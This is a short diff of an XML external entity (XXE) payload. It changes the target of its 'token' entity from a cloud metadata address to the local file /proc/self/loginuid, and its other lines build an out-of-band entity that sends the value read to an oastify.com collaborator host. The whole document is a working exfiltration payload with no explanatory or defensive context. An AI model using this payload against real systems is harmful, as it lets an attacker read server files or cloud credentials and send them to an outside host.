@@ -1,4 +1,4 @@
-<!ENTITY % token SYSTEM "http://169.254.169.254/latest/meta-data/hostname">
+<!ENTITY % token SYSTEM "file:///proc/self/loginuid">
 <!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://3ptqht07sa5frl7b5a19o4ou7ldc1cp1.oastify.com/%token;'>">
 %wrap;
 %send;
